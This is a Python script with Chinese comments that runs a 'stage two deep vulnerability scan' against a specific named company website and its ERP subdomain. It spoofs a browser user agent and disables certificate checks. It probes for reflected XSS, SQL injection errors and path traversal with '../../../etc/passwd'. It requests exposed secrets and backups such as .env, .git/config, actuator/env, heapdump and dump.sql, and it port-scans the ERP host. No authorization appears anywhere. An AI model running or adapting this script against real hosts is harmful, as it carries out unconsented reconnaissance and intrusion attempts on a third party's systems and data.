#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
深度漏洞扫描 - 第二阶段
"""

import requests
import socket
import json
import time
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,*/*",
    "Accept-Language": "zh-CN,zh;q=0.9",
})

# ============================================================
# 1. erp子域名扫描
# ============================================================
print("=" * 80)
print("  [1] erp.hbwfjt.com 子域名扫描")
print("=" * 80)

erp_target = "http://erp.hbwfjt.com"
try:
    resp = session.get(erp_target, timeout=10, allow_redirects=True)
    print(f"  URL: {resp.url}")
    print(f"  状态码: {resp.status_code}")
    print(f"  Server: {resp.headers.get('Server', 'N/A')}")
    print(f"  X-Powered-By: {resp.headers.get('X-Powered-By', 'N/A')}")
    print(f"  Content-Type: {resp.headers.get('Content-Type', 'N/A')}")
    print(f"  Set-Cookie: {resp.headers.get('Set-Cookie', 'N/A')[:120]}")
    print(f"  Content-Length: {len(resp.content)} bytes")
    
    # 识别技术栈
    body = resp.text
    if "title" in body:
        title_match = re.search(r'<title>(.*?)</title>', body, re.DOTALL)
        if title_match:
            print(f"  页面标题: {title_match.group(1).strip()[:80]}")
except Exception as e:
    print(f"  连接失败: {e}")

# ============================================================
# 2. sitemap.xml 解析
# ============================================================
print(f"\n{'='*80}")
print("  [2] sitemap.xml 解析")
print(f"{'='*80}")

try:
    resp = session.get("https://www.hbwfjt.com/sitemap.xml", timeout=10)
    if resp.status_code == 200:
        urls = re.findall(r'<loc>(.*?)</loc>', resp.text)
        print(f"  发现 {len(urls)} 个URL")
        
        # 统计路径类型
        path_types = {}
        for url in urls:
            path = url.replace("https://www.hbwfjt.com", "").split("?")[0]
            ext = path.split(".")[-1] if "." in path.split("/")[-1] else "directory"
            path_types[ext] = path_types.get(ext, 0) + 1
        
        print(f"  路径类型统计:")
        for ext, count in sorted(path_types.items(), key=lambda x: -x[1])[:15]:
            print(f"    .{ext}: {count}个")
        
        # 输出前20个URL
        print(f"\n  部分URL:")
        for url in urls[:20]:
            print(f"    {url}")
        
        # 检查是否有管理后台等敏感路径
        sensitive_keywords = ["admin", "login", "manage", "system", "config", "api", "upload", "backup"]
        sensitive_urls = []
        for url in urls:
            for kw in sensitive_keywords:
                if kw in url.lower():
                    sensitive_urls.append(url)
                    break
        
        if sensitive_urls:
            print(f"\n  ⚠️ 可能的敏感路径 ({len(sensitive_urls)}个):")
            for url in sensitive_urls[:10]:
                print(f"    {url}")
except Exception as e:
    print(f"  获取失败: {e}")

# ============================================================
# 3. 主站漏洞检测
# ============================================================
print(f"\n{'='*80}")
print("  [3] 主站漏洞检测")
print(f"{'='*80}")

# 3.1 XSS测试 (安全的检测标记)
print(f"\n  [3.1] XSS反射检测")
xss_tests = [
    ("搜索参数", "https://www.hbwfjt.com/", {"keyword": "xss_test_85f7210c", "search": "xss_test_85f7210c", "q": "xss_test_85f7210c", "wd": "xss_test_85f7210c"}),
    ("搜索参数", "https://www.hbwfjt.com/search", {"keyword": "xss_test_85f7210c", "q": "xss_test_85f7210c"}),
]

marker = "xss_test_85f7210c"
for name, url, params in xss_tests:
    for param_name, param_value in params.items():
        try:
            r = session.get(url, params={param_name: param_value}, timeout=8)
            if marker in r.text:
                print(f"  ✅ XSS反射: {url} 参数 [{param_name}] -> Payload原样反射!")
                idx = r.text.find(marker)
                ctx = r.text[max(0,idx-60):idx+80]
                print(f"     上下文: ...{ctx[:120]}...")
            else:
                pass  # 不输出未反射的
        except:
            pass

# 3.2 SQL注入检测 (安全检测，不执行破坏性操作)
print(f"\n  [3.2] SQL注入检测 (错误回显)")
sqli_tests = [
    ("单引号", "'", "syntax error|mysql|sql|ORA-|oracle|microsoft|ODBC|unclosed|exception"),
    ("双引号", '"', "syntax error|mysql|sql|ORA-|oracle|microsoft|ODBC"),
    ("数字溢出", "999999999999999", "overflow|error|exception"),
]

# 找到有参数的页面
test_urls = [
    "https://www.hbwfjt.com/",
]

for test_url in test_urls:
    for payload_name, payload, error_pattern in sqli_tests:
        for param in ["id", "page", "keyword", "search", "q"]:
            try:
                r = session.get(test_url, params={param: payload}, timeout=8)
                if re.search(error_pattern, r.text, re.IGNORECASE):
                    print(f"  ⚠️ 疑似SQL注入: {test_url} 参数 [{param}] Payload: {payload_name}")
                    # 提取错误信息片段
                    for pattern in error_pattern.split("|"):
                        match = re.search(f".{{0,50}}{pattern}.{{0,100}}", r.text, re.IGNORECASE)
                        if match:
                            print(f"     错误信息: {match.group()[:120]}")
                            break
            except:
                pass

# 3.3 目录遍历检测
print(f"\n  [3.3] 目录遍历检测")
traversal_payloads = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
]

for payload in traversal_payloads:
    for param in ["file", "path", "page", "include", "url"]:
        try:
            r = session.get("https://www.hbwfjt.com/", params={param: payload}, timeout=8)
            if "root:" in r.text or "[fonts]" in r.text:
                print(f"  ✅ 目录遍历: 参数 [{param}] Payload: {payload[:30]}")
        except:
            pass

# 3.4 信息泄露检测
print(f"\n  [3.4] 信息泄露检测")
info_paths = [
    "/web.config",
    "/.env",
    "/.git/config",
    "/.git/HEAD",
    "/WEB-INF/web.xml",
    "/wp-config.php.bak",
    "/config.php.bak",
    "/database.yml",
    "/application.properties",
    "/application.yml",
    "/backup.sql",
    "/dump.sql",
    "/phpinfo.php",
    "/info.php",
    "/test.php",
    "/console",
    "/debug",
    "/trace",
    "/swagger-ui.html",
    "/swagger-resources",
    "/api-docs",
    "/v2/api-docs",
    "/v3/api-docs",
    "/doc.html",
    "/actuator",
    "/actuator/env",
    "/actuator/health",
    "/actuator/info",
    "/druid",
    "/druid/index.html",
    "/hystrix",
    "/gateway/routes",
    "/nacos/",
    "/eureka/",
    "/jolokia",
    "/heapdump",
    "/mappings",
    "/beans",
    "/configprops",
    "/env",
]

for path in info_paths:
    try:
        r = session.get(f"https://www.hbwfjt.com{path}", timeout=5, allow_redirects=False)
        if r.status_code == 200 and len(r.content) > 50:
            content_type = r.headers.get("Content-Type", "")
            # 排除HTML错误页面
            if "text/html" not in content_type or len(r.content) < 5000:
                print(f"  ✅ {path} -> {r.status_code} | {len(r.content)} bytes | {content_type[:40]}")
            elif "text/html" in content_type:
                # 检查是否是真实的敏感内容
                if any(kw in r.text.lower() for kw in ["password", "secret", "key", "token", "database", "config"]):
                    print(f"  ⚠️ {path} -> {r.status_code} | 可能含敏感信息")
        elif r.status_code == 403:
            print(f"  🔒 {path} -> 403 Forbidden (路径存在但拒绝访问)")
    except:
        pass
    time.sleep(0.1)

# 3.5 HTTP方法检测
print(f"\n  [3.5] HTTP方法检测")
for method in ["OPTIONS", "PUT", "DELETE", "TRACE"]:
    try:
        r = requests.request(method, "https://www.hbwfjt.com/", timeout=5, verify=False, 
                           headers={"User-Agent": "Mozilla/5.0"})
        if r.status_code not in [405, 403, 404, 501]:
            print(f"  ⚠️ {method} -> {r.status_code} (可能不安全)")
        elif method == "OPTIONS" and r.status_code == 200:
            allow = r.headers.get("Allow", "")
            print(f"  OPTIONS: Allow={allow}")
    except:
        pass

# 3.6 Cookie安全检测
print(f"\n  [3.6] Cookie安全检测")
try:
    r = session.get("https://www.hbwfjt.com/", timeout=10)
    cookies = r.headers.get("Set-Cookie", "")
    if cookies:
        issues = []
        if "httponly" not in cookies.lower():
            issues.append("缺少HttpOnly")
        if "secure" not in cookies.lower():
            issues.append("缺少Secure")
        if "samesite" not in cookies.lower():
            issues.append("缺少SameSite")
        if issues:
            print(f"  ⚠️ Cookie安全问题: {', '.join(issues)}")
            print(f"     Set-Cookie: {cookies[:150]}")
        else:
            print(f"  ✅ Cookie安全配置正常")
except:
    pass

# ============================================================
# 4. erp.hbwfjt.com 端口扫描
# ============================================================
print(f"\n{'='*80}")
print("  [4] erp.hbwfjt.com 端口扫描")
print(f"{'='*80}")

try:
    erp_ip = socket.gethostbyname("erp.hbwfjt.com")
    print(f"  erp.hbwfjt.com -> {erp_ip}")
    
    erp_ports = [80, 443, 8080, 8443, 8888, 8081, 8088, 8090, 8099, 9090, 3306, 6379, 22, 1521, 5432, 7001, 9200, 9300, 27017]
    for port in erp_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((erp_ip, port))
            if result == 0:
                print(f"  ✅ {erp_ip}:{port} 开放")
            sock.close()
        except:
            pass
except Exception as e:
    print(f"  解析失败: {e}")

print(f"\n{'='*80}")
print("  深度扫描完成")
print(f"{'='*80}")
